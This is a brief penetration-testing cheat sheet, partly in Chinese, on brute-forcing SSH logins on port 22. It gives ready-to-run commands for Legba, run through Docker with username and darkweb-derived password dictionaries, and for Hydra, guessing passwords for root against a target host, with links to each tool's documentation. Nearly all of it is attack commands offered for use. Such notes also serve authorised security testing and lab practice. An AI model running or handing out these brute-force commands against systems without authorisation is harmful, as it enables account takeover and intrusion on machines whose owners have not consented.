# 22 SSH

## SSH 暴力破解

### 使用 Legba

```bash
HOST=; PORT=22; # TARGET HOST INFO
DICT_PATH=~/hack/dicts/hack-dict; # LOCAL DICT PATH
```

```bash
docker run \
  -v $DICT_PATH:/hack-dict \
  -v $(PWD):/out \
  --network host -it \
  evilsocket/legba:latest \
  ssh --target $HOST:$PORT \
  --username /hack-dict/username/top10.txt \
  --password /hack-dict/darkweb2017-top100.txt \
  -O /out/legba-ssh-outptu.txt
```

* [https://github.com/evilsocket/legba](https://github.com/evilsocket/legba)
* [https://github.com/evilsocket/legba/wiki/Installation-and-Building](https://github.com/evilsocket/legba/wiki/Installation-and-Building)
* [https://github.com/evilsocket/legba/wiki/Usage-and-Main-Options](https://github.com/evilsocket/legba/wiki/Usage-and-Main-Options)
* [https://github.com/evilsocket/legba/wiki/SSH-and-SFTP](https://github.com/evilsocket/legba/wiki/SSH-and-SFTP)

### 使用 Hydra

```bash
HOST=; PORT=22; # TARGET HOST INFO
DICT_PATH=~/hack/dicts/hack-dict; # LOCAL DICT PATH
```

```bash
hydra -l root -P $DICT_PATH/test-10.txt -t 4 ssh://$HOST:$PORT
```

* [https://github.com/vanhauser-thc/thc-hydra](https://github.com/vanhauser-thc/thc-hydra)
